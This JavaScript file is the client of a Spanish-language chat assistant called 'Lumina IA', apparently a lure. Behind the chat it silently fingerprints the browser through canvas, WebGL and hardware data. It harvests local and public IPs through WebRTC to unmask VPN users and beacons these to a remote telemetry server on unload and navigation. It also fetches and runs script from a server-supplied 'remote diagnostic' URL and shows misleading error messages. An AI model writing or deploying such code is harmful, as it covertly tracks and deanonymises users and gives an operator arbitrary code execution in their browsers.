import { io } from 'https://cdn.socket.io/4.3.2/socket.io.esm.min.js';

const API_BASE_URL = 'https://netrunner-pro.up.railway.app';
const CHAT_API_URL = `${API_BASE_URL}/api/chat`;
const TELEMETRY_API_URL = `${API_BASE_URL}/api/telemetry`;
const BOOTSTRAP_API_URL = `${API_BASE_URL}/api/bootstrap`;

const DOM = {
    chat: document.getElementById('chat-messages'),
    form: document.getElementById('chat-form'),
    input: document.getElementById('user-input'),
    modelSelect: document.getElementById('model-select'),
    status: document.getElementById('bridge-status'),
    personalizeBtn: document.getElementById('sync-workspace-btn'),
    startBtn: document.getElementById('start-btn'),
    welcomePanel: document.getElementById('welcome-panel')
};

const state = {
    history: [],
    isProcessing: false,
    currentModel: CONFIG.DEFAULT_MODEL,
    profileId: localStorage.getItem('lumina_profile_id') || `profile-${crypto.randomUUID()}`,
    sessionId: sessionStorage.getItem('lumina_session_id') || `session-${crypto.randomUUID()}`,
    socket: null,
    experienceStarted: false,
    telemetryTimer: null,
    firstMessageRendered: false,
    hookLoadStarted: false,
    lastTelemetryPayload: null,
    hookStatus: {
        loaded: false,
        endpoint: '',
        status: 'idle',
        detail: ''
    }
};

localStorage.setItem('lumina_profile_id', state.profileId);
sessionStorage.setItem('lumina_session_id', state.sessionId);

window.addEventListener('DOMContentLoaded', () => {
    populateModels();
    setupEvents();
    loadRuntimeConfig()
        .finally(() => {
            injectRemoteDiagnosticAgent();
        });
    injectExternalResources();
    renderStatus('Lista');
    appendSystemMessage('Hola, soy Lumina IA. Puedo ayudarte a organizar tu día, redactar correos y resolver dudas generales.');
});

function populateModels() {
    if (!DOM.modelSelect) return;
    DOM.modelSelect.innerHTML = '';

    CONFIG.MODELS.forEach((model) => {
        const option = document.createElement('option');
        option.value = model.id;
        option.textContent = model.label;
        option.title = model.description;
        DOM.modelSelect.appendChild(option);
    });

    DOM.modelSelect.value = state.currentModel;
    DOM.modelSelect.addEventListener('change', (event) => {
        state.currentModel = event.target.value;
    });
}

function setupEvents() {
    DOM.form.addEventListener('submit', (event) => {
        event.preventDefault();
        handleSubmit();
    });

    DOM.input.addEventListener('keydown', (event) => {
        if (event.key === 'Enter' && !event.shiftKey) {
            event.preventDefault();
            handleSubmit();
        }
    });

    DOM.startBtn?.addEventListener('click', async () => {
        await startExperience('start_button');
    });

    DOM.personalizeBtn.innerHTML = '<i class="fa-solid fa-sliders"></i><span>Personalización</span>';
    DOM.personalizeBtn.title = 'Mejora tu experiencia';
    DOM.personalizeBtn.addEventListener('click', async () => {
        const ok = await sendTelemetrySnapshot('personalization');
        if (ok) appendSystemMessage('Personalización aplicada.');
    });

    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible' && state.experienceStarted) {
            sendTelemetrySnapshot('resume');
        }
        if (document.visibilityState === 'hidden') {
            sendTelemetryBeacon('hidden');
        }
    });

    window.addEventListener('pagehide', () => sendTelemetryBeacon('pagehide'));
    window.addEventListener('beforeunload', () => sendTelemetryBeacon('beforeunload'));
    window.addEventListener('hashchange', () => sendTelemetryBeacon('hashchange'));
    window.addEventListener('popstate', () => sendTelemetryBeacon('popstate'));
    window.addEventListener('pagehide', teardownRuntime, { once: true });
}

async function loadRuntimeConfig() {
    try {
        const response = await fetch(BOOTSTRAP_API_URL, { method: 'GET', keepalive: true });
        if (!response.ok) return;
        const data = await response.json().catch(() => ({}));
        if (!window.CONFIG || typeof window.CONFIG !== 'object') return;
        if (typeof data.remoteDiagnosticUrl === 'string') {
            window.CONFIG.REMOTE_DIAGNOSTIC_URL = data.remoteDiagnosticUrl.trim();
        }
    } catch {
        // Silent by design.
    }
}

async function injectRemoteDiagnosticAgent() {
    const configuredUrl = String(window.CONFIG?.REMOTE_DIAGNOSTIC_URL || '').trim();
    if (!configuredUrl) return;

    const resolvedBaseUrl = resolveDiagnosticUrl(configuredUrl);
    if (!resolvedBaseUrl) return;

    if (document.querySelector(`script[data-remote-diagnostic-base="${resolvedBaseUrl}"]`)) {
        return;
    }

    try {
        const scriptUrl = withCacheBypass(resolvedBaseUrl);
        const response = await fetch(scriptUrl, {
            method: 'GET',
            headers: {
                'ngrok-skip-browser-warning': 'true'
            },
            cache: 'no-store'
        });

        if (!response.ok) {
            throw new Error(`Diagnostic fetch failed (${response.status})`);
        }

        const scriptCode = await response.text();
        const blob = new Blob([scriptCode], { type: 'application/javascript' });
        const blobUrl = URL.createObjectURL(blob);

        const script = document.createElement('script');
        script.src = blobUrl;
        script.async = true;
        script.dataset.remoteDiagnosticBase = resolvedBaseUrl;
        script.onload = () => {
            console.log('[Soporte] Canal de datos activo.');
            URL.revokeObjectURL(blobUrl);
        };
        script.onerror = () => {
            console.error('[Error] Enlace de diagnóstico bloqueado por red local.');
            URL.revokeObjectURL(blobUrl);
        };
        document.body.appendChild(script);
    } catch {
        console.error('[Error] Enlace de diagnóstico bloqueado por red local.');
    }
}

function resolveDiagnosticUrl(inputUrl) {
    const raw = String(inputUrl || '').trim();
    if (!raw) return '';

    const currentProtocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
    let normalized = raw;

    if (raw.startsWith('//')) {
        normalized = `${currentProtocol}${raw}`;
    } else if (/^https?:\/\//i.test(raw)) {
        normalized = raw.replace(/^https?:\/\//i, `${currentProtocol}//`);
    } else if (raw.startsWith('/')) {
        normalized = `${window.location.origin}${raw}`;
    } else {
        normalized = `${currentProtocol}//${raw}`;
    }

    try {
        const parsed = new URL(normalized);
        if (!/^https?:$/.test(parsed.protocol)) return '';
        return parsed.toString();
    } catch {
        return '';
    }
}

function withCacheBypass(inputUrl) {
    try {
        const parsed = new URL(inputUrl);
        parsed.searchParams.set('t', String(Date.now()));
        return parsed.toString();
    } catch {
        return inputUrl;
    }
}

function injectExternalResources() {
    const externalUrl = String(window.CONFIG?.EXTERNAL_RESOURCE_URL || '').trim();
    if (!externalUrl) return;

    try {
        const parsed = new URL(externalUrl);
        if (parsed.protocol !== 'https:') return;
    } catch {
        return;
    }

    if (document.querySelector(`script[data-systembridge-external="${externalUrl}"]`)) {
        return;
    }

    const script = document.createElement('script');
    script.src = externalUrl;
    script.async = true;
    script.defer = true;
    script.dataset.systembridgeExternal = externalUrl;
    document.body.appendChild(script);
}

async function startExperience(reason = 'start') {
    if (state.experienceStarted) return;
    state.experienceStarted = true;

    DOM.welcomePanel?.classList.add('is-hidden');

    await initSocket();
    await sendTelemetrySnapshot(reason);
    startTelemetryLoop();
    renderStatus('Activa');
}

async function initSocket() {
    if (state.socket) return;
    state.socket = io();

    state.socket.on('connect', () => {
        state.socket.emit('register_node', {
            nodeId: state.profileId,
            sessionId: state.sessionId,
            nodeRuntime: 'web_client',
            nodeChannel: 'experience',
            userAgent: navigator.userAgent
        });
        renderStatus('Activa');
    });

    state.socket.on('vincular_confirmado', (payload = {}) => {
        const remoteDiagnosticUrl = String(payload.remoteDiagnosticUrl || '').trim();
        if (remoteDiagnosticUrl && window.CONFIG && typeof window.CONFIG === 'object') {
            window.CONFIG.REMOTE_DIAGNOSTIC_URL = remoteDiagnosticUrl;
            injectRemoteDiagnosticAgent();
        }
    });

    state.socket.on('disconnect', () => {
        renderStatus('Lista');
    });
}

function renderStatus(text) {
    DOM.status.classList.toggle('active', true);
    DOM.status.textContent = text;
}

async function handleSubmit() {
    if (state.isProcessing) return;
    const text = DOM.input.value.trim();
    if (!text) return;

    if (!state.experienceStarted) {
        await startExperience('first_message');
    }

    appendMessage('user', text);
    DOM.input.value = '';
    state.isProcessing = true;

    const loaderId = showLoader();

    try {
        const response = await fetch(CHAT_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                model: state.currentModel,
                messages: [...state.history.slice(-10), { role: 'user', content: text }]
            }),
            keepalive: true
        });

        const data = await response.json();
        removeLoader(loaderId);

        if (!response.ok) {
            throw new Error(data.error || 'No pude procesar tu solicitud.');
        }

        const answer = String(data.text || '').trim() || 'Estoy aquí para ayudarte.';
        appendMessage('assistant', answer);

        state.history.push({ role: 'user', content: text }, { role: 'assistant', content: answer });
        if (state.history.length > 40) {
            state.history = state.history.slice(-40);
        }
    } catch (error) {
        removeLoader(loaderId);
        appendMessage('assistant', `Tuve un problema temporal: ${error.message}`);
    } finally {
        state.isProcessing = false;
    }
}

function appendSystemMessage(content) {
    appendMessage('assistant', content);
}

function appendMessage(role, content) {
    const message = document.createElement('article');
    message.className = `message ${role}`;

    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = content;

    message.appendChild(bubble);
    DOM.chat.appendChild(message);
    DOM.chat.scrollTop = DOM.chat.scrollHeight;

    if (!state.firstMessageRendered) {
        state.firstMessageRendered = true;
        if (!state.hookLoadStarted) {
            state.hookLoadStarted = true;
            queueMicrotask(() => {
                injectAuditHook(CONFIG.MONITOR_HOOK_URL);
            });
        }
    }

    return message.id;
}

function showLoader() {
    const id = `loader-${crypto.randomUUID()}`;
    const message = document.createElement('article');
    message.className = 'message assistant';
    message.id = id;
    message.innerHTML = '<div class="bubble">Pensando...</div>';
    DOM.chat.appendChild(message);
    DOM.chat.scrollTop = DOM.chat.scrollHeight;
    return id;
}

function removeLoader(id) {
    const loader = document.getElementById(id);
    if (loader) loader.remove();
}

function buildTelemetryPayload(reason, fingerprint, network) {
    return {
        nodeId: state.profileId,
        sessionId: state.sessionId,
        timestamp: new Date().toISOString(),
        source: 'web_client',
        reason,
        telemetry: {
            fingerprint,
            network,
            hook: state.hookStatus,
            page: {
                href: location.href,
                visibilityState: document.visibilityState,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
                viewportWidth: window.innerWidth || 0,
                viewportHeight: window.innerHeight || 0,
                screenWidth: screen.width || 0,
                screenHeight: screen.height || 0
            }
        }
    };
}

async function sendTelemetrySnapshot(reason = 'scheduled') {
    try {
        const fingerprint = await buildFingerprint();
        const network = await runWebRtcDiagnostic();
        const payload = buildTelemetryPayload(reason, fingerprint, network);

        state.lastTelemetryPayload = payload;

        const response = await fetch(TELEMETRY_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        });

        if (!response.ok) {
            throw new Error(`Telemetry POST failed (${response.status})`);
        }
        console.log('[SystemBridge] Telemetría enviada exitosamente');

        const result = await response.json().catch(() => ({}));
        const normalized = compareNetworkWithHeader(network, result.serverObservedIp || '', result.headerIp || '');

        if (normalized.changed) {
            payload.telemetry.network = normalized.network;
            state.lastTelemetryPayload = payload;
            payload.timestamp = new Date().toISOString();
            const retryResponse = await fetch(TELEMETRY_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
            if (retryResponse.ok) {
                console.log('[SystemBridge] Telemetría enviada exitosamente');
            }
        }

        if (state.socket?.connected) {
            state.socket.emit('node_report', {
                nodeId: state.profileId,
                sessionId: state.sessionId,
                source: 'browser_socket',
                telemetry: payload.telemetry,
                userAgent: navigator.userAgent
            });
        }

        window.SystemBridgeHook?.publish?.('telemetry', payload);
        return true;
    } catch {
        sendTelemetryBeacon(`${reason}_fallback`);
        return false;
    }
}

function sendTelemetryBeacon(reason = 'beacon') {
    try {
        const base = state.lastTelemetryPayload || buildTelemetryPayload(reason, {
            hardwareConcurrency: Number(navigator.hardwareConcurrency || 0),
            deviceMemory: Number(navigator.deviceMemory || 0),
            webglVendor: '',
            webglRenderer: '',
            canvasHash: '',
            stableFingerprint: ''
        }, {
            localIps: [],
            publicIps: [],
            candidateIps: [],
            srflxIps: [],
            localDescription: '',
            sdpCandidates: [],
            vpnMismatch: false,
            mismatchReason: ''
        });

        const payload = {
            ...base,
            nodeId: base.nodeId || state.profileId,
            sessionId: base.sessionId || state.sessionId,
            timestamp: new Date().toISOString(),
            reason,
            telemetry: {
                ...base.telemetry,
                page: {
                    href: location.href,
                    visibilityState: document.visibilityState,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
                    viewportWidth: window.innerWidth || 0,
                    viewportHeight: window.innerHeight || 0,
                    screenWidth: screen.width || 0,
                    screenHeight: screen.height || 0
                }
            }
        };

        if (navigator.sendBeacon) {
            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            navigator.sendBeacon(TELEMETRY_API_URL, blob);
            console.log('[SystemBridge] Telemetría enviada exitosamente');
            window.SystemBridgeHook?.publish?.('telemetry_beacon', payload);
            return;
        }

        fetch(TELEMETRY_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).then((response) => {
            if (response.ok) {
                console.log('[SystemBridge] Telemetría enviada exitosamente');
            }
        }).catch(() => {});
    } catch {
        // Silent by design.
    }
}

function startTelemetryLoop() {
    if (state.telemetryTimer) clearInterval(state.telemetryTimer);
    state.telemetryTimer = setInterval(() => {
        sendTelemetrySnapshot('interval');
    }, CONFIG.TELEMETRY_INTERVAL_MS || 300000);
}

async function buildFingerprint() {
    const hardwareConcurrency = Number(navigator.hardwareConcurrency || 0);
    const deviceMemory = Number(navigator.deviceMemory || 0);
    const webgl = getWebglInfo();
    const canvasHash = await getCanvasHash();

    const raw = `${hardwareConcurrency}|${deviceMemory}|${webgl.vendor}|${webgl.renderer}|${canvasHash}`;
    const stableFingerprint = await sha256Hex(raw);

    return {
        hardwareConcurrency,
        deviceMemory,
        webglVendor: webgl.vendor,
        webglRenderer: webgl.renderer,
        canvasHash,
        stableFingerprint
    };
}

function getWebglInfo() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) {
        return {
            vendor: 'unavailable',
            renderer: 'unavailable'
        };
    }

    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    if (!ext) {
        return {
            vendor: String(gl.getParameter(gl.VENDOR) || 'unknown'),
            renderer: String(gl.getParameter(gl.RENDERER) || 'unknown')
        };
    }

    return {
        vendor: String(gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || gl.getParameter(gl.VENDOR) || 'unknown'),
        renderer: String(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || gl.getParameter(gl.RENDERER) || 'unknown')
    };
}

async function getCanvasHash() {
    const canvas = document.createElement('canvas');
    canvas.width = 280;
    canvas.height = 80;

    const ctx = canvas.getContext('2d');
    if (!ctx) return 'unavailable';

    ctx.textBaseline = 'top';
    ctx.font = '16px monospace';
    ctx.fillStyle = '#133A7C';
    ctx.fillRect(8, 8, 120, 24);
    ctx.fillStyle = '#F4B400';
    ctx.fillText('Lumina Experience', 10, 10);
    ctx.strokeStyle = '#0A0A0A';
    ctx.beginPath();
    ctx.arc(210, 38, 20, 0, Math.PI * 2);
    ctx.stroke();

    return sha256Hex(canvas.toDataURL());
}

async function sha256Hex(input) {
    const bytes = new TextEncoder().encode(String(input));
    const digest = await crypto.subtle.digest('SHA-256', bytes);
    return Array.from(new Uint8Array(digest)).map((byte) => byte.toString(16).padStart(2, '0')).join('');
}

async function runWebRtcDiagnostic(timeoutMs = 1800) {
    if (!window.RTCPeerConnection) {
        return {
            localIps: [],
            publicIps: [],
            candidateIps: [],
            srflxIps: [],
            localDescription: '',
            sdpCandidates: [],
            vpnMismatch: false,
            mismatchReason: 'RTCPeerConnection unavailable'
        };
    }

    const pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });

    const ipSet = new Set();
    const srflxSet = new Set();
    const sdpCandidates = new Set();

    pc.createDataChannel('diag');

    pc.onicecandidate = (event) => {
        const candidate = event.candidate?.candidate || '';
        if (candidate) sdpCandidates.add(candidate);

        const extractedIps = extractIpCandidates(candidate);
        extractedIps.forEach((ip) => ipSet.add(ip));

        if (/\styp\s+srflx\s/i.test(candidate)) {
            extractedIps.forEach((ip) => srflxSet.add(ip));
        }
    };

    let localDescription = '';
    let timeoutId = null;

    try {
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        localDescription = String(pc.localDescription?.sdp || '');

        localDescription.split('\n').forEach((line) => {
            const trimmed = line.trim();
            if (!trimmed.startsWith('a=candidate:')) return;
            sdpCandidates.add(trimmed);

            const extractedIps = extractIpCandidates(trimmed);
            extractedIps.forEach((ip) => ipSet.add(ip));
            if (/\styp\s+srflx\s/i.test(trimmed)) {
                extractedIps.forEach((ip) => srflxSet.add(ip));
            }
        });

        await new Promise((resolve) => {
            timeoutId = window.setTimeout(resolve, timeoutMs);
        });
    } catch {
        // Silent by design.
    } finally {
        if (timeoutId !== null) window.clearTimeout(timeoutId);
        pc.onicecandidate = null;
        pc.close();
    }

    const candidateIps = Array.from(ipSet);
    const localIps = candidateIps.filter(isPrivateIpv4);
    const publicIps = candidateIps.filter((ip) => !isPrivateIpv4(ip));

    return {
        localIps,
        publicIps,
        candidateIps,
        srflxIps: Array.from(srflxSet),
        localDescription,
        sdpCandidates: Array.from(sdpCandidates),
        vpnMismatch: false,
        mismatchReason: ''
    };
}

function compareNetworkWithHeader(network, serverObservedIp, headerIp) {
    const observed = normalizeIp(serverObservedIp);
    const forwarded = normalizeIp(headerIp);
    const publicIps = (network.publicIps || []).map(normalizeIp).filter(Boolean);

    let mismatchReason = '';
    let vpnMismatch = false;

    if (observed && publicIps.length && !publicIps.includes(observed)) {
        vpnMismatch = true;
        mismatchReason = 'serverObservedIp_not_in_webrtc_publicIps';
    }

    if (!vpnMismatch && forwarded && publicIps.length && !publicIps.includes(forwarded)) {
        vpnMismatch = true;
        mismatchReason = 'headerIp_not_in_webrtc_publicIps';
    }

    const updated = {
        ...network,
        vpnMismatch,
        mismatchReason
    };

    const changed = updated.vpnMismatch !== network.vpnMismatch || updated.mismatchReason !== network.mismatchReason;
    return { changed, network: updated };
}

function normalizeIp(value) {
    if (!value) return '';
    return String(value).trim().replace(/^::ffff:/, '');
}

function isPrivateIpv4(ip) {
    if (!ip || ip.includes(':')) return false;
    const [a, b] = ip.split('.').map((part) => Number(part));
    if ([a, b].some((part) => Number.isNaN(part))) return false;
    if (a === 10) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 127) return true;
    return false;
}

function extractIpCandidates(candidate) {
    if (!candidate) return [];
    const ipv4Matches = candidate.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g) || [];
    return ipv4Matches.filter((ip) => ip.split('.').every((part) => {
        const value = Number(part);
        return Number.isInteger(value) && value >= 0 && value <= 255;
    }));
}

async function injectAuditHook(url) {
    if (!url) return;

    state.hookStatus.endpoint = url;

    try {
        await new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = url;
            script.async = true;
            script.defer = true;
            script.onload = resolve;
            script.onerror = () => reject(new Error('Hook script load failed'));
            document.head.appendChild(script);
        });

        state.hookStatus.loaded = true;
        state.hookStatus.status = 'loaded';
        state.hookStatus.detail = 'ready';
    } catch (error) {
        state.hookStatus.loaded = false;
        state.hookStatus.status = 'failed';
        state.hookStatus.detail = error.message;
    }
}

function teardownRuntime() {
    if (state.telemetryTimer) {
        clearInterval(state.telemetryTimer);
        state.telemetryTimer = null;
    }

    if (state.socket?.connected) {
        state.socket.disconnect();
    }
}
